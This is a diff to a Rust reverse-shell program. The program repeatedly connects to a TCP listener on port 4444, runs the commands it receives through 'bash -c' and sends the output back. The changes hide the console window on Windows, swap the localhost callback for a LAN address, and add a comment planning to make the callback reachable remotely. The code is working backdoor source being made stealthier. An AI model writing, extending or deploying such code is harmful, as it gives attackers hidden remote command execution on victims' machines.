@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 use std::{
     env,
     io::{BufRead, BufReader, Write},
@@ -14,7 +16,7 @@ const SHELL: [&str; 2] = ["bash", "-c"];
 
 fn main() {
     loop {
-        match TcpStream::connect("127.0.0.1:4444") {
+        match TcpStream::connect("192.168.1.10:4444") { // Will change to something that can be remotely read from
             Err(_) => {
                 thread::sleep(Duration::from_millis(5000));
                 continue;
@@ -34,7 +36,7 @@ fn main() {
                                 Ok(output) => {
                                     if cmd.starts_with("cd") {
                                         let _ = env::set_current_dir(
-                                            cmd.split_whitespace().nth(1).unwrap(),
+                                            cmd.split_whitespace().nth(1).expect("The system cannot find the path specified."),
                                         );
                                     }
                                     let _ = stream.write_all(
